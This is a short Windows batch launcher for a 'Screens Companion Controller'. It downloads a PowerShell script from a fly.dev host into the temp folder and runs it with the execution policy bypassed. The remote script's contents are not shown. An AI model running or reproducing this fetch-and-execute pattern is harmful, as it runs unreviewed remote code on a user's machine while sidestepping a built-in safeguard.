@echo off
title Screens Companion Controller
echo Preparing companion script...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://screens.fly.dev/companion.ps1' -OutFile '$env:TEMP\companion.ps1'"
if exist "%TEMP%\companion.ps1" (
    powershell -ExecutionPolicy Bypass -File "%TEMP%\companion.ps1"
) else (
    echo Error: Failed to download companion script. Please check your internet connection.
    pause
)
